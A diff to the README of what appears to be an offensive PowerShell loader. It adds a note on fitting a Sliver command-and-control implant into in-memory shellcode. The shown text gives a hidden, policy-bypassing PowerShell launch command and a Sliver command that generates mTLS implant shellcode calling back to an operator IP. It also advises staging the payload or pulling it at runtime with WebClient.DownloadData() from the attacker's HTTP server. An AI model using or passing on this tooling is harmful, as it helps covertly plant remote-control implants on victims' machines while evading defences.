@@ -41,6 +41,12 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-loader.ps1
 
 Executes raw shellcode in memory using only PowerShell reflection — no `Add-Type`, no P/Invoke declarations, no imported modules. Resolves `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` entirely at runtime via `LookupFunc`.
 
+> ⚠️ **Size:** a full Sliver session implant is **multi-MB** (Go runtime), so pasting
+> it as one inline `[Byte[]] $buf = 0x..,0x..,…` line is impractical. Use a small
+> **stage-1 stager** (Armory `beignet`/`malasada`, a few hundred bytes) as your
+> shellcode, or populate `$buf` at runtime with `WebClient.DownloadData()` and keep
+> the raw blob on your HTTP server.
+
 **1. Generate your shellcode:**
 ```bash
 sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
